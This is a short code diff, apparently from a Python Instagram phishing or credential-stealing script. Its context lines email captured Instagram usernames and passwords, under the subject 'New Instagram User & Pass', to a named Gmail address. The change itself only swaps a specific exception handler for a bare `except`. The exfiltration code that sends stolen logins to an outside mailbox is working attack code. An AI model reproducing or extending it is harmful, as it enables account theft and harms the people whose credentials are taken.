@@ -129,7 +129,8 @@ password = {password}
                     to_addrs="eyobjjj@gmail.com",
                     msg=f"Subject:**New Instagram User & Pass**\n\nhi {content}"
                 )
-        except Exception as e:
+        except:
+        #except Exception as e:
             print(f"{'*'*20} can't send email {'*'*20}")
             #print(type(e))
             #print(e)
